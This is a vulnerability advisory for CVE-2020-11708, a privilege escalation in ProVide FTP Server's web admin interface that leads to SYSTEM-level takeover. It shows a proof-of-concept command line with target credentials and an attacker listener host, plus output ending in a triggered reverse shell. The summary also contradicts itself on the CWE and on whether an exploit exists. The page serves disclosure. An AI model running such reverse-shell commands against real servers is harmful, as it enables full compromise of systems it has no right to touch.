---
layout: default
parent: ProVide FTP Server for Windows
nav_order: 8
title: CVE-2020-11708 - Privilege Escalation via EXECUTE()
---
# Web Admin Interface - Privilege Escalation via EXECUTE()

## Summary

The application allows the FTP server admin to execute programs upon certain events are triggered. This behaviour could be exploited by an attacker, to achieve Vertical Privilege Escalation, leading to full takeover of the underlying hosting server (From Web Application Admin to Windows NT\System user).

## VulDB-Like Summary

A vulnerability has been found in the Admin Web Interface of ProVide FTP Server (formerly zFTP) for Windows up to v13.1. It has been declared as critical. Affected by this vulnerability is an unknown part of the file /ajax/SetUserInfo. The manipulation of the parameter **messages** with an unknown input value leads to a privilege escalation vulnerability. The CWE definition for the vulnerability is CWE-79. As an impact it is known to affect confidentiality, integrity and availability. An attacker might be able to execute arbitrary code on the underlying hosting server, leading to full server takeover.

The weakness was disclosed 04/06/2020 by Alessandro Magnosi (deadc0de) (GitHub Repository). It is possible to read the advisory at github.com. This vulnerability is known as CVE-2020-11708. The attack can be launched remotely. A single authentication is needed for exploitation. Technical details of the vulnerability are known, but there is no available exploit.

## Proof-of-Concept

The [privesc.py](https://github.com/belong2yourself/vulnerabilities/blob/master/docs/ProVide/Web%20Admin%20Interface%20-%20Privilege%20Escalation%20via%20EXECUTE()/privesc.py) script has been provided to reproduce the issue.

```shell
root@kali:~# python3 privesc_exec.py -t 192.168.226.140 -u Admin -p Passw0rd! -H 192.168.226.129 -P 4444 
[+] Logging in
[+] Creating Rogue User
[+] Enabling FTP
[+] Setting up listener
[+] Triggering reverse shell
[+] Check your shell
```

A video is available as well, to easily understand what the impact could be.

## Remediation

Currently, no official fix is available for this issue.

## References

* [https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A5-Broken_Access_Control](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A5-Broken_Access_Control)
* [https://www.acunetix.com/blog/web-security-zone/what-is-privilege-escalation/](https://www.acunetix.com/blog/web-security-zone/what-is-privilege-escalation/)
* [https://cwe.mitre.org/data/definitions/269.html](https://cwe.mitre.org/data/definitions/269.html)